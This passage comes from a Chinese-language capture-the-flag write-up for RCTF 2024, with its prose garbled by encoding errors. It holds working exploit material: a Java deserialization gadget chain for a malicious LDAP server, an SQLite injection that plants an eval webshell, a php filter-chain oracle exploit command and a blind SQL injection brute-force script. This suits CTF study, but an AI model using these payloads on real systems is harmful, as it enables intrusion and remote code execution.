</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>POJONode</span><span class=w> </span><span class=n>jsonNodes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>POJONode</span><span class=p>(</span><span class=n>proxyObj</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BadAttributeValueExpException</span><span class=w> </span><span class=n>exp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BadAttributeValueExpException</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;javax.management.BadAttributeValueExpException&#34;</span><span class=p>).</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;val&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>val</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>val</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>exp</span><span class=p>,</span><span class=n>jsonNodes</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>barr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>objectOutputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>barr</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>objectOutputStream</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>exp</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>objectOutputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>res</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>barr</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>res</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>arg</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>field</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>arg</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å°†ç”Ÿæˆå¥½çš„é“¾å­æ”¾åˆ°HackerLDAPRefServer.javaå³å¯</p><p><img src=/img/2024-05-27-RCTF/fb0da3743efd604bf45284812d2b5652.png alt></p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href=https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload>https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload</a></p><p><a href=https://goodapple.top/archives/696>https://goodapple.top/archives/696</a></p><p><a href=https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referenceldap%E6%94%BB%E5%87%BB>https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referenceldap%E6%94%BB%E5%87%BB</a></p><p><a href=https://github.com/kxcode/JNDI-Exploit-Bypass-Demo>https://github.com/kxcode/JNDI-Exploit-Bypass-Demo</a></p><h2 id=proxy>Proxy</h2><p><code>Proxy.php</code>å…¶ä¸­çš„<code>$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'];</code>å¯è¢«ä¼ªé€ </p><p>å¯¼è‡´å¯ä»¥æ§åˆ¶å…¶è¿”å›å†…å®¹</p><p>æ³¨å…¥ç‚¹åœ¨<code>$ProxyObj->body</code>(å…¶ä»–åœ°æ–¹ä¹Ÿå¯ä»¥æ³¨å…¥ï¼Œä½†æ˜¯ä¼šå› ä¸ºåé¢çš„sqlè¯­å¥æ‰§è¡Œå¤±è´¥ï¼Œå¯¼è‡´æ— æ³•å†™å…¥æ–‡ä»¶)</p><p>vpsä¸Šé¢æ”¾å…¥å†…å®¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>&lt;?php 
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;a&#39;);ATTACH DATABASE &#39;/var/www/html/shell.php&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;&lt;?php eval(\$_GET[1]);?&gt;&#39;);--&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>ä¿®æ”¹Hostå¤´</p><p><img src=/img/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png alt></p><p>è®¿é—®<code>/shell.php?1=system('tac flag.php');</code></p><p><img src=/img/2024-05-27-RCTF/c55273600d978e3c1f63652ef1e8013e.png alt></p><h2 id=colorsolved>color(Solved)</h2><p>Jsåæ··æ·†åˆ†æ</p><p><img src=/img/2024-05-27-RCTF/c024ed1135e6e390d941dfa607010b77.png alt></p><p>å…ˆè®¿é—®jsç„¶åf12æ‰¾åˆ°åŠ å¯†è§£å¯†å‡½æ•°ç„¶åæ‰“æ–­ç‚¹ä¹‹åå†è®¿é—®æ ¹ç›®å½•ç©æ¸¸æˆå¯ä»¥çœ‹åˆ°å¯†é’¥</p><p><img src=/img/2024-05-27-RCTF/a.png alt></p><p>ç„¶åç¼–å†™è„šæœ¬ç©æ¸¸æˆ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>pad</span><span class=p>,</span> <span class=n>unpad</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt_data</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypted_data</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>pad</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>),</span> <span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_data</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted_data</span> <span class=o>=</span> <span class=n>unpad</span><span class=p>(</span><span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)),</span> <span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>decrypted_data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>post_data</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>raise_for_status</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Network error occurred: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;88b4dbc541cd57f2d55398e9be3e61ae&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;41cd57f2d55398e9&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://124.71.164.28:10088/final/game.php&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>501</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_action</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>(</span><span class=s2>&#34;4&#34;</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data1</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;3wrg4Ich1RsKFUUPmU0vlw==&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;rangeNum&#34;</span><span class=p>:</span> <span class=n>encrypted_action</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>response_text</span> <span class=o>=</span> <span class=n>post_data</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=n>data1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response_text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>parsed_data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>response_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>pos</span> <span class=o>=</span> <span class=n>decrypt_data</span><span class=p>(</span><span class=n>parsed_data</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>],</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>encrypted_pos</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>(</span><span class=n>pos</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>data2</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;s03/Zr+K7nTxLc2aiHJQcg==&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;pos&#34;</span><span class=p>:</span> <span class=n>encrypted_pos</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>response_text</span> <span class=o>=</span> <span class=n>post_data</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=n>data2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>response_text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>parsed_data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>response_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>status</span> <span class=o>=</span> <span class=n>decrypt_data</span><span class=p>(</span><span class=n>parsed_data</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>],</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>status</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data3</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;IMYZakV42qGIPRWdg/WfFg==&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response_text</span> <span class=o>=</span> <span class=n>post_data</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=n>data3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>response_text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>response_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2024-05-27-RCTF/b78bb6863e56b1c86be4bfd3feb0a5d5.png alt></p><p>è§£å¯†secret</p><p><img src=/img/2024-05-27-RCTF/b78bb6863e56b1c86be4bfd3feb0a5d5.png alt></p><p>å¾—åˆ°æºç <code>secr3tcolor.zip</code></p><p>ä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°<code>final/game.php</code>ä¸­ï¼Œå…¶ä¸­<code>action</code>éœ€è¦è¿›è¡ŒåŠ å¯†ä¼ é€</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nv>$key</span> <span class=o>=</span> <span class=s2>&#34;88b4dbc541cd57f2d55398e9be3e61ae&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$iv</span> <span class=o>=</span> <span class=s2>&#34;41cd57f2d55398e9&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>encoder</span><span class=p>(</span><span class=nv>$input</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$key</span><span class=p>,</span><span class=nv>$iv</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>encrypt</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$key</span><span class=p>,</span> <span class=nv>$iv</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>encrypt</span><span class=p>(</span><span class=nv>$plaintext</span><span class=p>,</span> <span class=nv>$key</span><span class=p>,</span> <span class=nv>$iv</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$encrypted</span> <span class=o>=</span> <span class=nx>openssl_encrypt</span><span class=p>(</span><span class=nv>$plaintext</span><span class=p>,</span> <span class=s1>&#39;aes-256-cbc&#39;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>,</span> <span class=nx>OPENSSL_RAW_DATA</span><span class=p>,</span> <span class=nv>$iv</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$encrypted</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>encoder</span><span class=p>(</span><span class=s2>&#34;checkImage&#34;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nv>$upload_image</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;image&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>getimagesize</span><span class=p>(</span><span class=nv>$upload_image</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>å­˜åœ¨ä¾§ä¿¡é“æ¼æ´ï¼Œä½†æ˜¯å¯æ§ç‚¹åœ¨æ–‡ä»¶ä¸Šä¼ çš„å†…å®¹</p><p>åŸºäºhttps://github.com/synacktiv/php_filter_chains_oracle_exploitè„šæœ¬è¿›è¡Œä¿®æ”¹</p><p><img src=/img/2024-05-27-RCTF/cabab988fe4d41430594cfc3ae8c6511.png alt></p><p><img src=/img/2024-05-27-RCTF/7d652a7e19399a3c53683aa792a38bb7.png alt></p><p>è¿è¡Œå³å¯</p><p><code>python3 filters_ chain_ oracle_exploit.py --target url/final/game.php --verb POST --parameter 0 --file /flag.txt</code></p><h2 id=what_-solved><strong>what_is_love</strong> <strong>(Solved)</strong></h2><p>key1è¿›è¡Œsqlæ³¨å…¥ï¼Œéœ€è¦å‰ååˆ†å¼€çˆ†ï¼Œpayloadä¸èƒ½è¶…è¿‡52ä½</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://1.94.13.174:10088/key1&#39;</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>list</span><span class=o>=</span><span class=s2>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_ </span><span class=si>{}</span><span class=s2>!@$%&amp;*()#.&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#&#39; || love_key REGEXP BINARY &#39;^{}&#39;#</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>40</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;key1&#34;</span><span class=p>:</span><span class=s2>&#34;&#39; || love_key REGEXP BINARY &#39;</span><span class=si>{}</span><span class=s2>$&#39;#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>j</span><span class=o>+</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;success&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span> <span class=n>j</span><span class=o>+</span><span class=n>flag</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>j</span> <span class=o>==</span> <span class=s1>&#39;.&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
